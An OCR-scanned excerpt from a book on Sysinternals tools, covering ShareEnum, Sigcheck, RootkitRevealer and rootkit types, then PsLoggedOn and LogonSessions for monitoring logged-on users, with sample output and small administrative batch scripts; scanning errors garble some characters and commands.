Chapter 3 9 Checking the Security of Your Computer 
So if user jsmith has been assigned both the Read share permission and the Change 
NTFS permission to the same file, this user's effective permission when accessing the 
file remotely will be Read. (Remember that ifjsmith accesses the file locally~for 
example, not through a file share~he will receive the Change NTFS permission 
because the share permissions will not be processed.) 
Because it is a relatively simple process to configure and enable file shares on a 
Windows computer, many administrators will find themselves in a position where 
they are unaware of which computers on their network are sharing files, and how 
those file shares have been configured and secured. Poorly configured file shares can 
pose a significant risk to a network by enabling unintended access to sensitive mate- 
rial, as well as leaving the computers themselves in an inherently insecure state. To 
help combat this, Sysinternals' ShareEnum (another free download) allows you to 
scan a local computer, an Internet Protocol (IP) address range, or an entire Windows 
domain to determine which computers are sharing files and how those shares are 
configured. 
Running ShareEnum 
and Interpreting Its Results 
To use ShareEnum to list the shares that the local computer is hosting, launch the 
ShareEnum GUI, select <IP Address Range> from the drop-down box, and 
then click Refresh.You'll see the screen shown in Figure 3.5. Enter the local com- 
puter's IP address in both the First address and Last address fields, and then click 
OK.You can also scan a range of IP addresses here, as well as select the name of your 
Windows domain to scan all PCs in the domain. 
Figure 3.5 Selecting the Local Computer's IP Address 

Checking the Security of Your Computer 9 Chapter 3 
133 
Once the tool has scanned the local computer, you'll see the screen shown in 
Figure 3.6. ShareEnum will provide you with the following information about each 
share configured on the local computer: 
9 The share path, such as \\ITS-HUNTER-LT\Eclipse 
9 The local path, such as C:\eclipse 
9 The domain, such as BUSINESS.COM 
9 The type, such as Disk 
9 The share permissions that have been granted to the Everyone security 
group (shown in the Everyone column) 
9 The users and groups that have been granted the Read share permission 
(shown in the Other Read column) 
9 The users and groups that have been granted the Change share permission 
(shown in the Other Write column) 
9 The users and groups that have been configured with the No Access share 
permission (shown in the Deny column) 
Figure 3.6 Analyzing the Results of ShareEnum 

134 
Chapter 3 9 Checking the Security of Your Computer 
Similar to AccessEnum, you can save the results of ShareEnum to a tab-delimited 
text file by clicking on Export. In addition, you can compare your current share 
configuration against a tab-delimited file that you've saved previously by clicking on 
File I Compare to Saved. Follow these steps to see this process in action: 
1. 
Perform a scan of the local computer by specifying its IP address. 
2. 
Click Export to save a copy of the report as a file named before.txt. 
3. 
Make a change to the security settings of a share, such as granting the 
Everyone group Change permission to the share. 
4. 
Rerun the ShareEnum scan. When it has completed, click on File I 
Compare to Saved. 
5. 
Browse to the before.txt file and click Open.You will see the screen shown 
in Figure 3.7. In particular, note that the Everyone group has gained both 
Read and Write access to the shared folder. 
Figure 3.7 Comparing Shared Folder Permissions over Time 
r 
www.syngress.com 
h~. 

Checking the Security of Your Computer 9 Chapter 3 
135 
Investigating 
Suspicious Local Files (Sigcheck) 
One of the ways in which viruses and rootkits like to "hide" on a computer is by 
overwriting a Windows system file with a malicious copy. This makes trou- 
bleshooting a misbehaving system and diagnosing a virus or rootkit quite difficult, 
since utilities such as the Task Manager and the Services Control Panel MMC will 
display a well-known file name such as lsass.exe or svchost.exe. To help combat this, 
the free Sigcheck utility from Sysinternals can help you to record metadata such as 
the version number and the publisher of a file. This can immediately point out that a 
file has been changed: the file publisher is listed as "John Smith" rather than 
"Microsoft Corporation," for example. More importantly, Sigcheck will verify 
whether a particular file has a digital signature. By running Sigcheck multiple times 
and comparing the output over time, you can identify whether a file that you expect 
to be signed is unsigned, or whether the signing entity (the company that signed the 
file) has changed unexpectedly. By default, Sigcheck runs against the local computer, 
but you can use PsExec to run it against a remote computer. 
Running Sigcheck and Interpreting Its Results 
Sigcheck runs as a command-line utility and can take one or more of the following 
switches: 
9 
-c Look for signature in the specified catalog file. 
9 
-e Scan executable images only (regardless of their extension). 
9 
-i Show image signers. 
9 
--n Show file version number only. 
9 
-q Quiet (no banner). 
9 
-s Recurse subdirectories. 
9 
-u Show unsigned files only. 
9 
-v CSV (comma-separated values) output. 
For example, the syntax in Code Listing 3.5 will scan all files in the 
C:\Windows\System32 directory and all of its subdirectories. 
www.syngress.com 

136 
Chapter 3 9 Checking the Security of Your Computer 
Code Listing 3.5 Verifying Signatures Using Sigcheck 
sigcheck -s c:\windows\system32 
c: \windows\system32\6to4svc.dll : 
Verified: 
Signed 
Signing date: 
4:58 AM 8/4/2004 
Publisher : 
Microsoft Corporation 
Description: 
Service that offers IPv6 connectivity over an IPv4 
network. 
Product: 
Microsoft~ Windows~ Operating System 
Version: 
5.1.2600.2180 
File version: 
5.1.2600.2180 
(xpsp_sp2_rtm.040803-2158) 
c:\windows\system32\aaaamon.dll: 
VeriHed: 
Signed 
Signing date: 
4:58 AM 8/4/2004 
Publisher: 
Microsoft Corporation 
Description: 
Aaaa Monitor DLL 
Product: 
Microsoft~ Windows~ Operating System 
Verslon: 
5.1.2600.0 
File version: 
5.1.2600.0 (xpclient.010817-1148) 
c:\windows\system32\access.cpl: 
Verified: 
Signed 
Signing date: 
4:58 AM 8/4/2004 
Publisher: 
Microsoft Corporation 
Description: 
Control Panel DLL 
Product: 
Microsoft~ Windows~ Operating System 
Verslon: 
5.1.2600.2180 
File version: 
5.1.2600.2180 
(xpsp_sp2_rtm.040803-2158) 
c:\windows\system32\acctres.dll: 
VeriHed: 
Signlng date: 
Publisher: 
Description: 
Product: 
Version: 
File version: 
Signed 
4:58 AM 8/4/2004 
Microsoft Corporation 
Microsoft Internet Account Manager Resources 
Microsoft~ Windows~ Operating System 
6.00.2600.0000 
6.00.2600.0000 
(xpclient.010817-1148) 
c: \windows\system32 \accwiz. exe : 
Verified: 
Signed 

Checking the Security of Your Computer 9 Chapter 3 
137 
Signing date: 
Publisher: 
Description: 
Product: 
Version: 
File version: 
4:58 AM 8/4/2004 
Microsoft Corporation 
Microsoft Accessibility Wizard 
Microsoft~ Windows~ Operating System 
5.1.2600.2180 
5.1.2600.2180 (xpsp_sp2_rtm.040803-2158) 
You can use the-i switch to see detailed information concerning the signing 
entity that signed the file, as shown in Code Listing 3.6. 
Code Listing 3.6 Viewing File Signer Information 
sigcheck -s -i c:\windows\system32 
c:\windows\system32\6to4svc.dll: 
Signers: 
Microsoft Windows Publisher 
Microsoft Windows Verification Intermediate PCA 
Microsoft Root Authority 
Signing date: 
4:58 AM 8/4/2004 
Publisher: 
Microsoft Corporation 
Description: 
Service that offers IPv6 connectivity over an IPv4 
network. 
Product: 
Microsoft~ Windows~ Operating System 
Version: 
5.1.2600.2180 
File version: 
5.1.2600.2180 (xpsp_sp2_rtm.040803-2158) 
c:\windows\system32\aaaamon.dll: 
Signers: 
Microsoft Windows Publisher 
Microsoft Windows Verification Intermediate PCA 
Microsoft Root Authority 
Signing date: 
Publisher: 
Description: 
Product: 
Version: 
File version: 
4:58 AM 81412004 
Microsoft Corporation 
Aaaa Monitor DLL 
Microsoft~ Windows~ Operating System 
5.1.2600.0 
5.1.2600.0 (xpclient.010817-1148) 
c : \windows \ system32 \access. cpl : 
Signers : 
Microsoft Windows Publisher 

138 
Chapter 3 9 Checking the Security of Your Computer 
Microsoft Windows Veri~cation Intermediate PCA 
Microsoft Root Authority 
Signing date: 
4:58 AM 8/4/2004 
Publisher: 
Microsoft Corporation 
Description: 
Control Panel DLL 
Product: 
Microsoft~ Windows~ Operating System 
Version: 
5.1.2600.2180 
File version: 
5.1.2600.2180 (xpsp_sp2_rtm.040803-2158) 
c:\windows\system32\acctres.dll: 
Signers: 
Microsoft Windows Publisher 
Microsoft Windows Verification Intermediate PCA 
Microsoft Root Authority 
Signing date: 
Publisher: 
Description: 
Product: 
Version: 
File version: 
4:58 AM 8/4/2004 
Microsoft Corporation 
Microsoft Internet Account Manager Resources 
Microsoft~ Windows~ Operating System 
6.00.2600.0000 
6.00.2600.0000 (xpclient.010817-1148) 
Searching for Installed 
Rootkits (RootkitRevealer) 
In recent months, one of the more highly publicized security threats to personal and 
business computers has been that of rootkits. A rootkit is a set of software tools that 
an attacker will install on a victim's computer, usually without the victim's knowl- 
edge. Hackers are typically able to install rootkits by taking advantage of unpatched 
computer systems, or even fully patched systems that are running potentially vulner- 
able services (such as Microsoft Exchange, SQL Server, or Active Directory) without 
www.syngress.com 

Checking the Security of Your Computer ~ Chapter 3 
139 
the protection of a software- or hardware-based firewall. Rootkits are particularly 
insidious in that they are designed to be installed without the user being aware of 
their presence. The methods that a rootkit uses to hide itself from the user can also 
render it undetectable by traditional methods such as antivirus or even antispyware 
utilities. 
One common question when dealing with rootkits is the difference between a 
rootkit and a virus or a worm. In most cases, a rootkit will be concerned with main- 
taining control over only a single compromised system; a virus, on the other hand, 
will use email or network shares to attempt to propagate itself to multiple com- 
puters. A blended threat, meanwhile, combines the worst parts of a virus and a rootkit" 
It spreads through a malicious email attachment, installing rootkits as it goes. Many 
rootkits are publicly available on the Internet so that inexperienced attackers (often 
called script kiddies) can perform attacks using tools that they would never know 
how to create on their own. 
Mthough hundreds of rootkits are publicly available, you can generally classify 
them into one of four categories" 
Persistent rootkits These will execute or launch every time a computer 
boots or a user logs on without any user intervention. This type of rootkit 
will store code in a persistent fashion, using the Registry or the Windows 
file system. 
Memory-based rootkits These will reside only within RAM, and will 
not persist beyond a reboot of the physical computer. 
User-mode rootkits These will attempt to evade detection by "hiding" 
the user level of the operating system, often by interfering with the com- 
puter's ability to display files and folders properly and thus hiding the files 
associated with the rootkit. 
at 
Kernel-mode rootkits These operate at a lower level in the Windows 
operating system and are therefore much more powerful and difficult to 
detect. A kernel-mode rootkit can even hide itself from the list of processes 
displayed in the Windows Task Manager or the Sysinternals Process 
Explorer. 

140 
Chapter 3 9 Checking the Security of Your Computer 
Scanning a Computer for Rootkits 
One of the best tools available for rootkit detection is Sysinternals' Rootkitl<evealer. 
This utility can run either as a command-line tool or through a GUI. The user 
account that you use to run Rootkitl~evealer should have at least the following level 
of permissions: 
9 
Back up files and directories 
9 
Load drivers 
9 
Perform volume maintenance tasks ('Windows XP and later) 
You need to run the P,.ootkitRevealer GUI from the local console (you can't 
run it through a Remote Desktop session).You can see the main GUI screen in 
Figure 3.8. From this screen, you can perform a scan of the local computer. By 
default, the following optional scan settings are enabled: 
9 
Hide NTFS Metadata Files This setting will instruct R.ootkitR.evealer 
not to show standard NTFS metadata files, since these are hidden from the 
Windows API by default. 
9 
Scan Registry This setting will instruct I<ootkitRevealer to scan the 
Windows Registry for any anomalies in addition to the file system. 
Figure 3.8 Running RootkitRevealer 

Checking the Security of Your Computer 9 Chapter 3 
141 
To perform a scan of the local hard drive, simply click File I Scan. If 
RootkitRevealer discovers any suspicious files or folders, it will classify them as 
follows: 
9 Hidden from Windows API Rootkits usually exhibit this behavior 
when trying to hide their presence from the user or administrator. 
However, some legitimate files are hidden from Windows, particularly files 
relating to the NTFS file system. If you deselect the Hide NTFS recta- 
data files option during the scan, you'll likely see a number of entries, 
including the following: SAttrDef, SBadClus, SBadClus:$Bad, SBitMap, 
$Boot, SLogFile, SMft, SMftMirr, $Secure, SUpCase, SVolume, $Extend, 
SExtend\$tLeparse, SExtend\$ObjId, SExtend\$UsnJrnl, 
SExtend\$UsnJrnl:$Max, SExtend\$Quota. Some antivirus products will 
also hide information from the Windows API, which can generate a 
number of false positives during a RootkitRevealer scan. 
9 Visible in Windows API, directory index, but not in MFT; Visible 
in Windows API, but not in MFT or directory index; Visible in 
Windows API, MFT, but not in directory index; and Visible in 
directory index, but not Windows API or MFT These classifications 
can indicate that a file was created or deleted during the scanning process. 
Windows API length not consistent with raw hive data This report 
can occur if a rootkit has inserted a hidden value into the Registry. 
However, it can also be the result of a Registry value changing during the 
course of the scan. 
9 
Type mismatch between Windows API and raw hive data This 
report will occur if a Registry key is holding a different data type than it 
should. For example, a key that is advertising itself as a REG_DWORD 
value should not be storing REG_BINARY data. 
9 Key name contains embedded nulls This report will occur if a 
Registry key contains null characters that can render it invisible to the stan- 
dard Registry editing GUI interface. 
9 
Data mismatch between Windows API and raw hive data This 
report can occur if there is a discrepancy between the actual value that's 
being stored in a Registry key and the value that's been reported to the 
Windows API. This can also indicate a false positive if a Registry value is 
updated while the scan is in progress. 

142 
Chapter 3 9 Checking the Security of Your Computer 
As an example, Figure 3.9 shows the result of a scan in which I intentionally 
deleted a few folders from my C:\ drive while the scan was running. 
Figure 3.9 Viewing the Results of a RootkitRevealer Scan 
You can also run RootkitRevealer from the command line using the following 
syntax: 
rootkitrevealer 
[-a [-c] [-m] [-r] outputfile] 
From the command line, this utility takes the following switches: 
9 
-a Automatically performs a scan and exits when it is completed. 
9 
-c Formats the tool's output in comma separated value (CSV) format. This 
allows information to be stored in a database or similar product for further 
analysis. 

Checking the Security of Your Computer 9 Chapter 3 
143 
9 
-m Instructs RootkitRevealer to scan NTFS metadata files. 
9 
-r Instructs RootkitRevealer not to scan the Windows Registry. 
9 
output.jfle Designates a location on the local hard drive to store 
RootkitRevealer's output. 
By default, RootkitRevealer will scan the local hard drive for the presence of 
malware; however, you can combine the command-line version of RootkitRevealer 
with PsExec to scan a remote computer as follows: 
psexec \\remote -c rootkitrevealer.exe -a c:\windowsXsystem32\rootkit.log 
Removing a Rootkit 
Once you've determined that a computer has been compromised with a rootkit, 
what's next? How can you remove malicious software that's been so completely 
embedded in a system as to almost entirely avoid detection? Unfortunately, in many 
cases, you can't. Because rootkits alter the Windows operating system at a very low 
level, it's often impossible to determine exactly which files have been modified or 
replaced; in many cases, you'll find a rootkit that installs additional rootkits to leave 
the hacker additional "doors" into the system if one is removed. Rootkits will also 
often use this technique to reestablish themselves once you have cleaned or restored 
a particular file~if the rootkit detects that someone has replaced a compromised 
lsass.exe, for example, another rootkit process will reinfect the file all over again. In 
many cases, it is impossible to remove the rootkit manually without rendering your 
Windows system unstable or even unable to boot. 
Because rootkits come in many different flavors and configurations there is no 
"one size fits all" tool to remove every rootkit that you may run into. This is why 
RootkitRevealer doesn't offer any options for rootkit removal; you need to investigate 
each rootkit infection individually to determine whether you can safely remove the 
rootkit or whether you need to reinstall Windows from scratch. For example, you can 
remove the Sony DRM rootkit that caused such a furor in 2005 by downloading and 
installing a patch from Sony, but if you've been rootkitted by a malicious and anony- 
mous Internet attacker, you won't have this option available to you. In fact, some so- 
called rootkit removal tools that you can find on the Internet are themselves malicious 
software; you're simply trading in one rootkit for another. (For this reason, it is critical 
that you download and install files only from a trusted source, particularly when you 
are attempting to assess and eradicate a malware infection.) 

144 
Chapter 3 9 Checking the Security of Your Computer 

Checking the Security of Your Computer 9 Chapter 3 
145 

146 
Chapter 3 9 Checking the Security of Your Computer 
Summary 
Sometimes antivirus and antispyware programs do not catch all of the malware that 
affects your computer, and standard Windows tools can only scratch the surface of 
the in-depth information that you need to diagnose a malware-infested computer. 
System programmers can develop tools that enable them to troubleshoot computers 
effectively, and the Sysinternals team has made a number of these tools available to 
help system administrators and end users improve the security of anything from a 
single machine to a large corporate network. 
From reading this chapter, you should be familiar with the following Sysinternals 
tools: AccessEnum, EFSDump, PendMoves, MoveFile, ShareEnum, and 
RootkitRevealer. These tools enable you to perform tasks such as viewing the secu- 
rity settings of your resources, listing users who can access encrypted files, moving or 
deleting files in use on reboot, investigating suspicious local files, and searching for 
installed rootkits. Examples of code were included to help you learn how to use 
these tools to meet your own troubleshooting needs. 
Solutions Fast Track 
Viewing the Security 
Settings of Your Resources (AccessEnum) 
Windows file and folder security uses a series of access control entries 
(ACEs) to make up an access control list (ACL) for each file and folder. 
When a user has multiple ACLs of differing permissions for a particular 
resource he will receive the least restrictive access that he has been granted. 
AccessEnum can display a report of file and folder permissions that you've 
assigned. It also can compare your current configuration to an earlier, saved 
report to see whether anything has been modified. 
Listing the Users with 
Access to Encrypted Files (EFSDump) 
Beginning with Windows 2000, the Windows operating system allows users 
to encrypt files as an additional layer of security. 

Checking the Security of Your Computer 9 Chapter 3 
gl It's critical to configure one or more Data Recovery Agents (DRAs) who 
can gain access to encrypted files if the owner of the files leaves the 
company or is otherwise unavailable. 
Vr 
EFSDump will produce a report of which users are permitted to decrypt a 
file, as well as which users are configured as DRAs. 
Moving/Deleting Files in Use 
on Reboot (PendMoves, MoveFile) 
gl Many critical Windows files can be updated and deleted only at system 
bootup, since they are in use at all other times that the computer is 
running. 
Vii PendMoves will display the queue of files that are to be modified, moved, 
or deleted on the next Windows reboot. 
gl MoveFile allows you to insert your own entries into boot-time 
modifications or deletions. 
Viewing Shared Resources and 
Their Access Permissions (ShareEnum) 
Share permissions are available for most Windows operating systems; even 
those that do not support NTFS file permissions. 
g'r You can configure a user or group with one of the following permissions 
to a Windows share: Full Control, Change, Read, or No Access. 
ShareEnum will scan the local computer, a range of IP addresses, or an 
entire domain to produce a list of shared files, including information about 
the physical path to the shared folder and what permissions have been 
configured on the share. 
147 

148 
Chapter 3 9 Checking the Security of Your Computer 
Investigating Suspicious Local Files (Sigcheck) 
Vr Most critical Windows system files will be digitally signed to verify their 
authenticity. 
Vr Viruses, rootkits, and worms can modify or replace system files with 
malicious executables, but this will affect the files' digital signatures. 
You can use Sigcheck for a one-time scan or to track the digital signatures 
of files on a hard disk over time to ensure that nothing has been 
maliciously altered. 
Searching for Installed Rootkits (RootkitRevealer) 
gl RootkitRevealer will search a hard drive for any files that are hidden from 
the Windows API, or that might otherwise indicate the presence of a 
rootkit. 
[-4I You need to run the RootkitRevealer GUI from the local console; the 
command-line tool can scan remote computers by using Sysinternals' 
PsExec utility. 
Vr RootkitRevealer does not offer options for rootkit removal; you need to 
research the nature of the individual rootkit to determine whether you can 
remove it or whether you need to reinstall the operating system of the 
compromised computer. 


150 
Chapter 3 9 Checking the Security of Your Computer 
Q- i recently moved an encrypted file to another location on my file server, only to 
discover that it was no longer encrypted. Why did this happen? 
A: Most likely, this means that you moved the file onto a FAT-formatted volume, 
since the FAT file system does not support file encryption. If you copy or move 
an encrypted file between NTFS volumes, the file will retain its encrypted status 
even if the folder you're moving it into does not have encryption enabled. (If 
you move an unencrypted file into an encrypted folder, however, the unen- 
crypted file will be encrypted by default.) 
www.syngress.com 


152 
Chapter 4 9 Computer Monitoring 
Introduction 
Windows, by default, provides you with several utilities to monitor local activity on a 
computer, whether that activity is coming from users or from processes. Detailed 
monitoring is required to detect unauthorized access, discover suspicious activity, and 
gain a deep overall understanding of what is going on in the background. Much in 
the same way a network administrator would use a packet sniffer or an intrusion 
detection system (IDS) to monitor activity on a computer, a system administrator or 
an advanced user can utilize the tools provided by the Winternals team. 
In this chapter, you will learn how to use Sysinternals tools to monitor active 
sessions on a computer and discover which processes are accessing which resources. 
You will also learn how to get a live listing of all file and Registry activity, and 
where that activity is coming from. 
Viewing Users Who Are 
Logged On and What They're Doing 
Knowing who is using the resources on your network and what they are doing with 
those resources is an essential ability for any administrator. Thankfully, tools are avail- 
able from Sysinternals that allow us to get an overview of the users who are logged 
on to a computer, as well as information about the sessions created when users log 
on and what files or resources they are using. 
Using PsLoggedOn to See Logged-On Users 
Windows comes with the capability to list remote users who are logged on to your 
computer using the net session command, but it does not provide the capability to see 
users who are logged on to remote computers. PsLoggedOn is a command-line tool 
that provides this functionality. PsLoggedOn allows you to see which users are 
logged on remotely and locally to a local computer, a remote computer, or all of the 
computers in a domain.You can download PsLoggedOn at 
www.sysinternals.com/Utilities/PsLoggedOn.html. As PsLoggedOn is a console pro- 
gram, you simply need to copy it onto your hard drive and run it from there. 
The syntax for the program is very simple, as shown here (you can find this same 
help text by typing PsLoggedOn -? at the command prompt): 
Usage: PsLoggedOn.exe 
[-I] [-x] [\\computername] 
or PsLoggedOn. exe [username] 
-i 
Show only local logons 
-x 
Don't show logon times 

Computer Monitoring 9 Chapter 4 
153 
If you type PsLoggedOn.exe at the command prompt without any arguments, 
it will list the local and remote users currently connected to the computer from 
which you ran the program. For the most part, you can mix and match command- 
line arguments, except when it comes to the username and computername parameters. 
When running PsLoggedOn.exe, you can use either the computername or the user- 
name parameter; you cannot use both in the same run. 
Code Listing 4.1 shows sample PsLoggedOn.exe output. 
Code Listing 4.1 Searching a Domain for the User Named Sysinternals 
C: \PsLoggedOn. exe Sysinternals 
PsLoggedOn vi.32 - Logon Session Displayer 
Copyright (C) 1999-2006 Mark Russinovich 
Sysinternals - www. Sysinternals.com 
Development\Sysinternals 
logged onto BACKUP remotely. 
Development\Sysinternals 
logged onto Forensics remotely. 
DEVDOMAIN\Sysinternals 
logged onto DEVELOPMENT locally. 
Error opening HKEY_USERS for Saturn 
Unable to query resource logons 
Development\Sysinternals 
logged onto NEWGUY remotely. 
Development\Sysinternals 
logged onto SERVER remotely. 
In Code Listing 4.1, you can see all the users who are logged on to a computer 
in the current domain. The listing shows both the local and the remote users who 
are connected to each computer. Though this information is good to have, when 
you specify a certain computer to query, you can get even more detail, such as the 
users' logon times. Code Listing 4.2 provides an example. 

154 
Chapter 4 9 Computer Monitoring 
Code Listing 4.2 Listing the Local and Remote Users on a Remote Machine 
C:\ >PsLoggedOn.exe \\server\ 
PsLoggedOn vi.32 - Logon Session Displayer 
Copyright (C) 1999-2006 Mark Russinovich 
SysInternals - www.sysinternals.com 
Users logged on locally: 
4/1/2006 11:26:14 AM 
DEVDOMAIN\Administ rator 
Users logged on via resource shares: 
4/1/2006 2:36:39 PM 
DEVDOMAIN\NEWGUY$ 
4/1/2006 2:33:03 PM 
DEVDOMAIN \NEWGUY$ 
4/1/2006 2:38:22 PM 
Development\Sysinternals 
With the aforementioned command, we now can see when the particular user 
actually logged on to the remote computer. This information is invaluable, especially 
when you can combine it with simple batch files that can process it. The next sec- 
tion provides some examples of these types of scripts. 
Real-World Examples 
A useful attribute of the Sysinternals command-line tools is that you can use them 
in batch files and scripts. This allows you to automate tasks based on the output of 
these tools. In this section, I'll show you some basic scripts that utilize the 
PsLoggedOn.exe command to make an administrator's job easier. 
Listing Users Logged On Locally to Computers in the Domain 
When you use PsLoggedOn.exe to query the domain for all local logons, it will 
query every machine in that domain. Some networks comprise hundreds if not 
thousands of computers, however, and thus, the query process can take an extremely 
long time. Instead, you can use a batch file that reads a list of the specific computers 
that should be scanned.As a result, PsLoggedOn.exe will query only that specific set 
of computers, thereby saving you a great a deal of time. 
To start, create a text file called computers.txt and add a list of computer names 
to it. Then create a batch file called local.bat and enter the following code: 
www.syngress.com 

Computer Monitoring 9 Chapter 4 
155 
@echo of f 
FOR /F "tokens=l" %%i in (computers.txt) do echo Local users on \\%%i & 
PsLoggedOn.exe -i \\%%i I find "/" 
Now when you run local.bat, it will query all the computers in the 
computers.txt file and list the local users connected to them. In order for this batch 
file to work, you must have the PsLoggedOn.exe executable in your path. 
Logging a User Off the Console Depending on His Logon Date 
It is common for an administrator to install new updates for an operating system or 
application when users log on to their computers. What do you do, though, about 
users who never log off their computers and thus never receive the new updates? 
The batch file in the next example solves this problem by allowing an administrator 
to schedule a task that checks when a user logged on via PsLoggedOn.exe and 
whether that logon date is older than a specific date (4/5/06 in our example). Then 
it uses PsShutdown.exe, another PsTools utility, to log them off the console. Now 
when they log back on, they will get the new updates. 
To start, create a file, tlogoff.bat, and enter the following commands: 
@echo off 
for /F %%i in ('PsLoggedOn.exe -i ^l find "/"') do if %%i GEQ 4/5/06 
psshutdown -o 
Once the batch file is created, copy the file to the computer's system drive, along 
with the PsLoggedOn and PsShutdown executables, and issue an at command to 
schedule the batch file to run at midnight. The next time the batch file executes, it 
will compare the date found in the batch to the logged-on date, and if the logged- 
on date is older than the date that you specify in the batch file, it will log the user 
off the console. 
Using LogonSessions to 
Find Information about a Logged-On User 
Logon sessions are a Windows topic that does not get much coverage in books and 
other media. With the lack of literature also comes lack of a built-in Windows tool 
that allows us to see logon sessions and the information they contain. Luckily for us, 
Sysinternals has a tool that will allow us to list all the active logon sessions on a 
Windows computer. Before we get started using LogonSessions.exe, I feel it is 
important to provide a brief overview as to what a logon session is and how it inter- 
acts with the operating system. 

156 
Chapter 4 9 Computer Monitoring 
Understanding Logon Sessions 
When a user, service, or device authenticates to Windows, Windows will create a 
special data structure called a logon session. This session is a unique identifier to the 
particular account that has just logged on. In order for Windows to keep track of 
which logon session belongs to which account, it assigns each session with a locally 
unique identifier (LUID) called a logon ID. (For more information, go to 
http://msdn.microsoft.com/library/en-us/secgloss/security/l_gly.asp.) 
Each LUID is 
guaranteed to be unique until the computer is rebooted. Once the computer is 
rebooted, an LUID used in a previous startup can be used again. 
A logon session contains information that includes the username, the domain 
name, the type of authentication used, the time of the logon, and other specific 
information that applies to your account. All of this information contained in the 
session, when taken as a whole, defines the account as it relates to the operating 
system. 
Sessions also play a crucial role in security. An object called an access token con- 
tains all the security information for a particular logon session and defines the per- 
missions an account has for various tasks in the operating system. Just as a logon 
session is the embodiment of a particular account on the operating system, the access 
token is the embodiment of privileges this account has. When a user logs on to a 
computer, a new access token is created and is attached to the user's initial Windows 
processes. Furthermore, when that same user runs additional processes, these pro- 
cesses inherit a copy of the initial token created when the user logs on. A user is 
considered logged off the system, and the logon session is destroyed, when no more 
tokens are left that refer to that session. I will discuss tokens in more detail in the 
section titled "Using Tokenmon to Monitor a User's Security Tokens and 
Understanding Its Output," later in this chapter. 
Using LogonSessions.exe to 
View Current Windows Sessions 
LogonSessions.exe is a command-line program that enumerates all the active 
Windows logon sessions on a computer. It does so by querying the current tokens; if 
at least one token references the LUID of a session, that logon session exists. To use 
LogonSessions.exe, simply download it from www.sysinternals.com/Utilities/ 
LogonSessions.html and extract it to a location on your hard drive. 
When you want to run it, simply execute the LogonSessions.exe command in a 
console window. The program contains one command-line argument,-p, which will 
also list any processes currently running under that logon session. When you execute 
www.syngress.com 

Computer Monitoring 9 Chapter 4 
157 
the program, you will see a list of the active logon and certain information about 
each one, as shown in the next section. 
Understanding the Output of LogonSessions.exe 
When you run LogonSessions.exe, it will display the active sessions and information 
about each one. Here is an example session that I will use to describe each charac- 
teristic pertaining to LogonSessions output: 
[5] Logon session 00000000:00016d0a: 
User name : 
DEVDOMAIN\Sysinternals 
Auth package : Kerberos 
Logon type : 
CachedInteractive 
Session: 
0 
Sid: 
S-I-5-21-329068152-688789844-1202660629-II04 
Logon time: 
3/31/2006 4:57:15 PM 
Logon server : SERVER 
DNS Domain: 
DEVDOMAIN. COM 
UPN : 
Each active session receives an index, or count, shown between the brackets. The 
session indexes start at zero, so the aforementioned session is actually the sixth one 
shown, rather than the fifth one. The other characteristics are defined as Follows" 
9 
Logon 
session The numbers after the logon session is this session's LUID. 
9 
User name The username used to log on to the computer. 
9 
Auth package The dynamic link libraries (DLLs) that perform authenti- 
cation on the provided credentials when an account logs on. 
9 
Logon type The type of logon requested. 
9 
Session The session number for a user connected to the computer via 
Terminal Services. If the user is not connected via Terminal Services, this 
number will be zero. 
9 
SID A unique value, of variable length, that is used to designate a partic- 
ular security group or entities in Windows. The SID is broken down into 
various parts, each designating a particular purpose. Some well-known SIDs 
are constant between all Windows installations and are used to represent 
generic security groups or entities. 
9 
Logon time The time the user logged on and the session was created. 
www.syngress.com 

158 
Chapter 4 9 Computer Monitoring 
9 
Logon server The server that was used to authenticate the user. 
9 
DNS Domain The DNS domain used during authentication. 
9 
UPN An Internet-style name used during logon; for example, 
user@domain.com. 
Table 4.1 outlines some common authentication packages, Table 4.2 shows the 
common logon types, and Table 4.3 lists some common, well-known SIDs you will 
see when running this program (for a more complete list of SIDs, surf to http://sup- 
port.microsoft.com/kb/243330). 
Table 4.1 Common Authentication Packages 
Authentication Package 
Kerberos 
MSV1 0 
Negotiate 
NTLM 
Description 
Commonly used for authentication to a 
domain. 
Commonly used for authenticating to NT 4.0 
domains or for a local computer that cannot 
find a domain controller. 
Used when the operating system makes the 
decision as to which protocol would be 
better used to authenticate the account that 
is logging on. The two protocols it will 
choose from are Kerberos or NTLM (NT LAN 
Manager) 
Used when Kerberos authentication is 
unavailable or for Iogons into sites in the 
Internet security zone. 
Table 4.2 Common Logon Types 
Logon Type 
Interactive 
Network 
Batch 
Service 
NetworkCleartext 
Cached lnteractive 
www.syngress.com 
Description 
A Iogon from the keyboard. 
A Iogon over the network. 
A Iogon used from within a batch process. 
A Iogon by a service. 
Specifies that the Iogon used cleartext information. 
Specifies that the Iogon used cached credentials 
instead of logging on through the network. 

Computer Monitoring 9 Chapter 4 
159 
Table 4.3 Well-Known SIDs 
SlD 
S-1-5-7 
S-1-5-18 
S-1-5-19 
S-1-5-20 
S 1 5 domain identifier 500 
S 1 5 domain identifier 501 
Description 
Users who have logged on anonymously. 
A system service; started implicitly at bootup. 
A local service; started implicitly at bootup. 
A network service; started implicitly at 
bootup. 
The system administrator account. 
The guest account. 
Now that you understand what each piece of information means, let's take some 
sample output of LogonSessions.exe and dissect it together: 
C : \ >LogonSessions. exe 
Logonsessions vl.l 
Copyright (C) 2004 Bryce Cogswell and Mark Russinovich 
Sysinternals - wwww.sysinternals.com 
[0] Logon session 00000000:000003e4: 
User name: 
NT AUTHORITY\NETWORK SERVICE 
Auth package: Negotiate 
Logon type: 
Session: 
Sid: 
Logon time: 
Logon server: 
DNS Domain: 
UPN: 
Service 
0 
S-I-5-20 
4/3/2006 4:56:11 PM 
[I] Logon session 00000000:000003e5: 
User name: 
NT AUTHORITY\LOCAL SERVICE 
Auth package: Negotiate 
Logon type : 
Service 
Session: 
0 
Sid: 
S-I-5-19 
Logon time: 
4/3/2006 4:56:13 PM 
Logon server : 

160 
Chapter 4 9 Computer Monitoring 
DNS Domain: 
UPN : 
[2] Logon session 00000000:0000ffll: 
User name: 
NT AUTHORITY\ANONYMOUS LOGON 
Auth package: NTLM 
Logon type: 
Session: 
Sid: 
Logon time: 
Logon server: 
DNS Domain: 
UPN: 
Network 
0 
S-I-5-7 
4/3/2006 4:56:28 PM 
[3] Logon session 
User name: 
Auth package: 
Logon type: 
Session: 
Sid: 
Logon time: 
Logon server: 
DNS Domain: 
UPN: 
00000000:00016d0a: 
DEVDOMAIN\Sysinternals 
Kerberos 
Interactive 
0 
S-I-5-21-329068152-688789844-1202660629-II04 
3/31/2006 4:57:15 PM 
SERVER 
DEVDOMAIN.COM 
